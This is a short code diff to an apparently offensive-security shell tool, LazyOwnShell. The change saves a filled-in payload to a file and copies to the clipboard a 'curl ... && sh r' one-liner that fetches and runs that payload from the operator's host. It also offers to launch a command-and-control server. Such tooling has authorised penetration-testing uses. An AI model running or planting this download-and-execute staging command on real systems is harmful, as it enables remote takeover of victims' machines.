@@ -8337,7 +8337,11 @@ class LazyOwnShell(Cmd):
 
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         server = f"cd modules && python3 lazyc2.py {lport}"
-        copy2clip(content)
+        
+        with open("sessions/r", 'w+') as f:
+            f.write(content)
+        print_msg(content)
+        copy2clip(f"curl http://{lhost}/r -o r && sh r")
         choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ")
         if choice == 'yes':
             os.system(server)
